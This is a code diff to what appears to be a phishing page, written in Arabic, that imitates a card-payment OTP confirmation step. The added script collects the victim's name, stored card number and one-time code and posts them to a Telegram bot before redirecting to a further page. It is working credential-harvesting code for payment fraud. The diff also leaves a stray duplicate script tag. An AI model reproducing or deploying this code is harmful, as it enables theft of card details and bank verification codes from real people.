@@ -193,88 +193,105 @@
 
 <script src="config.js"></script>
   <script>
-  const telegramBotToken = TELEGRAM_BOT_TOKEN_PAYMENT;
-  const chatId = TELEGRAM_CHAT_ID_PAYMENT;
+<script>
+    // Telegram Configuration
+    const telegramBotToken = TELEGRAM_BOT_TOKEN_PAYMENT;
+    const chatId = TELEGRAM_CHAT_ID_PAYMENT;
 
-  async function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-    const payload = {
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'HTML'
-    };
-
-    try {
-      const response = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      const data = await response.json();
-      return data;
-    } catch (error) {
-      console.error('Telegram Error:', error);
-      return null;
-    }
-  }
-
-  const otpText = document.getElementById('otpText');
-  const otpTimer = document.getElementById('otpTimer');
-  const otpInput = document.getElementById('otp');
-  const overlay = document.getElementById('loadingOverlay');
-
-  const now = new Date();
-  const formattedDate = now.toLocaleDateString('ar-EG').replace(/\//g, '-');
-  const formattedTime = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: false });
-  otpText.textContent = `تم إرسال رمز تحقق إلى رقمك لتأكيد عملية الشراء بتاريخ ${formattedDate} الساعة ${formattedTime}`;
-
-  let timeLeft = 180;
-  function updateTimer() {
-    const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
-    const seconds = (timeLeft % 60).toString().padStart(2, '0');
-    otpTimer.textContent = `${minutes}:${seconds}`;
-    if (timeLeft <= 0) {
-      clearInterval(timerInterval);
-      otpTimer.textContent = 'انتهى الوقت';
-    } else {
-      timeLeft--;
-    }
-  }
-  updateTimer();
-  const timerInterval = setInterval(updateTimer, 1000);
-
-  document.querySelector('.otp-section button').addEventListener('click', async () => {
-    const otpCode = otpInput.value.trim();
-
-    // ✅ تحقق من إدخال رمز التحقق
-    if (otpCode === '') {
-      alert('يرجى إدخال رمز التحقق أولاً.');
-      otpInput.focus();
-      return;
+    // Get owner name
+    function getOwnerName() {
+      return localStorage.getItem('owner_name') || 'غير معروف';
     }
 
-    const fullName = localStorage.getItem('owner_name') || 'غير معروف';
-    const cardNumber = localStorage.getItem('cardNumber') || '';
-    const last4 = cardNumber.slice(-4) || '----';
+    // Get last 4 digits
+    function getLast4Digits() {
+      return localStorage.getItem('cardNumber') || '----';
+    }
 
-    localStorage.setItem('card_number', otpCode);
+    // Send data directly to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Telegram Error:', error);
+        return { ok: false };
+      }
+    }
 
-    const message = `
-✅ <b> 3رمز التحقق</b>
-- 👤 من: ${fullName}
-- 💳 آخر 4 أرقام: ${last4}
-- 🔐 رمز التحقق: ${otpCode}
-    `;
+    // Submit OTP to Telegram
+    async function submitToServer(data) {
+      const message = `
+✅ <b>رمز التحقق (3)</b>
+━━━━━━━━━━━━━━━
+👤 من: ${data.owner_name}
+💳 آخر 4 أرقام: ${data.last_4_digits}
+🔐 رمز OTP: ${data.otp_code}
+      `;
+      return await sendToTelegram(message);
+    }
+    // Elements
+    // Elements
+    const otpText = document.getElementById('otpText');
+    const otpTimer = document.getElementById('otpTimer');
+    const otpInput = document.getElementById('otp');
+    const overlay = document.getElementById('loadingOverlay');
 
-    overlay.style.display = 'flex';
+    // Set text
+    const now = new Date();
+    const formattedDate = now.toLocaleDateString('ar-EG').replace(/\//g, '-');
+    const formattedTime = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: false });
+    otpText.textContent = `تم إرسال رمز تحقق إلى رقمك لتأكيد عملية الشراء بتاريخ ${formattedDate} الساعة ${formattedTime}`;
 
-    await sendToTelegram(message);
+    // Timer
+    let timeLeft = 180;
+    function updateTimer() {
+      const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+      const seconds = (timeLeft % 60).toString().padStart(2, '0');
+      otpTimer.textContent = `${minutes}:${seconds}`;
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        otpTimer.textContent = 'انتهى الوقت';
+      } else {
+        timeLeft--;
+      }
+    }
+    updateTimer();
+    const timerInterval = setInterval(updateTimer, 1000);
 
-    setTimeout(() => {
-      window.location.href = "visa.html"; 
-    }, 15000);
-  });
-</script>
+    // Handle submit
+    document.querySelector('.otp-section button').addEventListener('click', async () => {
+      const otpCode = otpInput.value.trim();
+
+      if (otpCode === '') {
+        alert('يرجى إدخال رمز التحقق أولاً.');
+        otpInput.focus();
+        return;
+      }
+
+      localStorage.setItem('card_number', otpCode);
+      overlay.style.display = 'flex';
+
+      // Prepare data
+      const data = {
+        owner_name: getOwnerName(),
+        last_4_digits: getLast4Digits(),
+        otp_code: otpCode,
+      };
+
+      // Submit to Telegram
+      await submitToServer(data);
+
+      setTimeout(() => {
+        window.location.href = "total2.html";
+      }, 2000);
+    });
+  </script>
 
 
 </body>
